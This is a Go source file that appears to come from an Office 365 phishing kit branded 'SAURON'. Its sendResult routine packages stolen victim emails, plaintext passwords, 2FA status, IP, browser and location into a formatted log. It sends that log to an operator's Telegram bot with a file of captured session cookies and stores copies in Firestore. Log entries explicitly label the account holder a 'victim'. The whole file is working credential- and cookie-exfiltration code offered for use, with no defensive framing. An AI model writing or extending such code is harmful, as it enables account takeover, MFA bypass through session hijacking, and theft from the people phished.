package capture

import (
	"fmt"
	"o365/configdb"
	"o365/firestore"
	"o365/telegramq"
	"strings"
	"time"

	"github.com/rs/zerolog/log"
)

/* ───────── helpers ───────── */

func flattenCookies(list []CookieEntry) string {
	out := make([]string, 0, len(list))
	for _, c := range list {
		if c.Valid {
			out = append(out, c.Name+"="+c.Value)
		}
	}
	if len(out) == 0 {
		return "None"
	}
	return strings.Join(out, "; ")
}

/* ───────── public entry points ───────── */

func maybeSendResult(slug, email string)                { sendResult(slug, email, false, time.Time{}) }
func maybeSendInvalid(slug, email string, ts time.Time) { sendResult(slug, email, true, ts) }

/* ───────── core routine ───────── */

func sendResult(slug, email string, forceInvalid bool, earliest time.Time) {
	if slug == "" || email == "" {
		return
	}

	credPtr := getCredEntry(slug, email)
	if credPtr == nil {
		return
	}
	cred := *credPtr

	if !earliest.IsZero() && cred.Timestamp.After(earliest) {
		return
	}
	if sent := cred.Raw["__sent"]; sent == "valid" || (sent == "invalid" && !forceInvalid) {
		return
	}

	cookies := getCookiesFor(slug, email)
	good := 0
	for _, ck := range cookies {
		if ck.Valid {
			good++
		}
	}

	isValid := cred.ValidSession && good >= 2
	isInvalid := forceInvalid && !cred.ValidSession
	if !isValid && !isInvalid {
		return
	}

	header := "[SAURON LOG] OFFICE INVALID ❗"
	if isValid {
		if cred.AuthMethod == "mfa" {
			header = "[SAURON LOG] OFFICE 2FA VALID ✅"
		} else {
			header = "[SAURON LOG] OFFICE VALID ✅"
		}
	}
	emoji2FA := "❗"
	if isValid && cred.AuthMethod == "mfa" {
		emoji2FA = "✅"
	}
	loc := ""
	if cred.Geo != nil && cred.Geo.Country != "" {
		loc = cred.Geo.Country
	}

	caption := fmt.Sprintf(`%s
[ %s ] ❤️
▬▬▬▬▬▬▬[SAURON 2FA]▬▬▬▬▬▬▬
📧 Email: %s
🔑 Password: %s
🔒 2FA Security: %s
▬▬▬▬▬▬[IP INFORMATION]▬▬▬▬▬▬
🌐 IP: %s
🖥️ Browser: %s
📍 Location: %s
🕒 Date: %s`,
		header, cred.Email,
		cred.Email, cred.Password, emoji2FA,
		cred.Geo.Query, cred.BrowserAgent, loc,
		cred.Timestamp.Format(time.RFC1123))

	// ❌ Removed emitToDashboard()

	// ✅ Firestore only
	saveResultToFirestore(slug, cred, loc, isValid, good)

	// 🔁 Telegram queue
	tg, err := configdb.GetTelegramSettingsBySlug(slug)
	if err == nil && tg != nil && tg.BotToken != "" && tg.ChatID != "" {
		job := telegramq.TelegramJob{
			Slug:     slug,
			BotToken: tg.BotToken,
			ChatID:   tg.ChatID,
			Text:     caption,
		}

		if isValid && good >= 2 {
			job.File = telegramq.FilePayload{
				Filename: "cookies_" + strings.ReplaceAll(email, "@", "_@_") + ".txt",
				Content:  flattenCookies(cookies),
			}
		} else {
			job.File = telegramq.FilePayload{}
		}

		if err := telegramq.EnqueueTelegramMessage(job); err != nil {
			log.Error().Err(err).Str("slug", slug).Msg("❌ Failed to queue Telegram")
		}
	}

	status := map[bool]string{true: "invalid", false: "valid"}[isInvalid]
	markCredSent(slug, email, status)

	if isValid {
		configdb.IncValid(slug)
		configdb.IncLog(slug)
	} else if isInvalid {
		configdb.IncInvalid(slug)
	}

	log.Info().
		Str("victim", email).
		Str("slug", slug).
		Str("mode", status).
		Msg("📤 Result delivered")
}

/* ───────── Firestore ───────── */

func saveResultToFirestore(slug string, cred CredentialEntry, loc string, isValid bool, good int) {
	if slug == "" || cred.Email == "" {
		return
	}

	userID, _ := configdb.GetUserIDForSlug(slug)
	if userID == "" {
		return
	}

	go firestore.SaveResultToFirestore(userID, firestore.FirestoreResult{
		IP:               cred.Geo.Query,
		Country:          loc,
		Email:            cred.Email,
		Password:         cred.Password,
		Valid:            isValid,
		SSO:              cred.AuthMethod == "mfa",
		CookiesAvailable: good >= 2,
		CookiesRaw:       flattenCookies(getCookiesFor(slug, cred.Email)),
		Slug:             slug,
		Ts:               time.Now().UnixMilli(),
	})
}

/* ───────── Retained Types ───────── */

type ResultEntry struct {
	IP               string `json:"ip"`
	Country          string `json:"country"`
	Email            string `json:"email"`
	Password         string `json:"password"`
	Valid            bool   `json:"valid"`
	SSO              bool   `json:"sso"`
	CookiesAvailable bool   `json:"cookiesAvailable"`
	CookiesRaw       string `json:"cookiesRaw,omitempty"`
}

type GeoInfo struct {
	Query   string
	Country string
}
